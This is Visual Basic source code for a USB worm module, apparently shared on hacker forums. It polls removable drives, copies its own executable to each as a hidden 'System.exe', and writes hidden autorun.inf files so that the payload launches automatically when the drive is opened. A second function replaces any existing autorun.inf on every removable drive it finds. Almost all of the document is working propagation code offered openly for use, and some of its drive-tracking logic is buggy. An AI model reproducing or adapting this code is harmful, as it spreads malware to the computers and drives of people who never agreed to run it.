Attribute VB_Name = "mUSBspread"
''''''''''''''''''''''''''''''''''''''''''''''''
'  ______                           _ _        '
' / _____) _                       | | |       '
'( (____ _| |_  ____ ___   ___   __| | | _____ '
' \____ (_   _)/ ___) _ \ / _ \ / _  | || ___ |'
' _____) )| |_| |  | |_| | |_| ( (_| | || ____|'
'(______/  \__)_|   \___/ \___/ \____|\_)_____)'
'                                              '
''''''''''''''''''''''''''''''''''''''''''''''''

Dim E As Boolean
Dim F As Boolean
Dim G As Boolean
Dim h As Boolean
Dim i As Boolean

Private Sub Form_Load()
Timer1.Enabled = True
Timer2.Enabled = True

E = False
F = False
G = False
h = False
i = False

End Sub

Private Sub Timer1_Timer()
If Dir("E:\") <> "" And E = False Then
FileCopy App.Path & "\" & App.EXEName & ".exe", "E:\System.exe"
Open "E:\autorun.inf" For Append As #1
     Print #1, "[autorun]"
     Print #1, "open=System.exe"
    Close #1
SetAttr "E:\System.exe", vbHidden
SetAttr "E:\autorun.inf", vbHidden
E = True
End If

If Dir("F:\") <> "" And F = False Then
MsgBox "USB IN DRIVE F."
FileCopy App.Path & "\" & App.EXEName & ".exe", "F:\System.exe"
Open "F:\autorun.inf" For Append As #1
     Print #1, "[autorun]"
     Print #1, "open=System.exe"
    Close #1
SetAttr "F:\System.exe", vbHidden
SetAttr "F:\autorun.inf", vbHidden
F = True
End If

If Dir("G:\") <> "" And G = False Then
FileCopy App.Path & "\" & App.EXEName & ".exe", "G:\System.exe"
Open "G:\autorun.inf" For Append As #1
     Print #1, "[autorun]"
     Print #1, "open=System.exe"
    Close #1
SetAttr "G:\System.exe", vbHidden
SetAttr "G:\autorun.inf", vbHidden
G = True
End If

If Dir("H:\") <> "" And h = False Then
FileCopy App.Path & "\" & App.EXEName & ".exe", "H:\System.exe"
Open "H:\autorun.inf" For Append As #1
     Print #1, "[autorun]"
     Print #1, "open=System.exe"
    Close #1
SetAttr "H:\System.exe", vbHidden
SetAttr "H:\autorun.inf", vbHidden
h = True
End If

If Dir("I:\") <> "" And i = False Then
FileCopy App.Path & "\" & App.EXEName & ".exe", "I:\System.exe"
Open "I:\autorun.inf" For Append As #1
     Print #1, "[autorun]"
     Print #1, "open=System.exe"
    Close #1
SetAttr "I:\System.exe", vbHidden
SetAttr "I:\autorun.inf", vbHidden
i = True
End If

End Sub

Private Sub Timer2_Timer()

If Dir("E:\") = "" And E = True Then
E = False
End If

If Dir("F:\") = "" And F = True Then
F = False
End If

If Dir("G:\") = "" And G = True Then
F = False
End If

If Dir("H:\") = "" And h = True Then
F = False
End If

If Dir("I:\") = "" And i = True Then
F = False
End If

End Sub




''''''''''''''''''''''''''''''''''''''''

' + Author
' Programmed By Who!
' who@hotmail.ru

' + Thanx To Friends
' Kill3r7, Carb0n, Syntax_Err, Slayer616 ,Akama, RoMeO, LTTCoder, ChainCoder, SquEzER, BinaryHero, -slient-

' + Fuck To Friends
' Supra = Nortingo = Mesrine , YOYOP, R@NGER, MADMAX

' Coded In TURKEY
' USB SPREAD SOURCE

' http://www.opensc.ws
' http://www.hackhound.org

Public Function INFECT_USB(YOL As String, AD As String)
Dim FSO, SURUCULER, SURUCU

Set FSO = CreateObject("SCRIPTING.FILESYSTEMOBJECT")
Set SURUCULER = FSO.DRIVES
For Each SURUCU In SURUCULER
If SURUCU.DRIVETYPE = 1 Then 'EGER SILINEBILIR ISE

If Right(YOL, 1) <> "\" Then YOL = YOL & "\"

If DosyaVarmi(SURUCU & "\autorun.inf") Then
SetAttr SURUCU & "\autorun.inf", 0
Kill SURUCU & "\autorun.inf"
End If

Open SURUCU & "\autorun.inf" For Append As #1
Print #1, "[autorun]" & vbCrLf & _
"open=" & SURUCU & "\" & AD
Close #1

If Not DosyaVarmi(SURUCU & "\" & AD) Then
FileCopy YOL & AD, SURUCU & "\" & AD
End If

SetAttr SURUCU & "\" & AD, 4 'DOSYA OZNITELIKLERINI UYGULA
SetAttr SURUCU & "\autorun.inf", 4
SetAttr SURUCU & "\" & AD, 2
SetAttr SURUCU & "\autorun.inf", 2
End If
Next

End Function

Public Function DosyaVarmi(DosyaAdi As String) As Boolean
On Error GoTo DosyaYok
Call FileLen(DosyaAdi)
DosyaVarmi = True
Exit Function
DosyaYok:
End Function



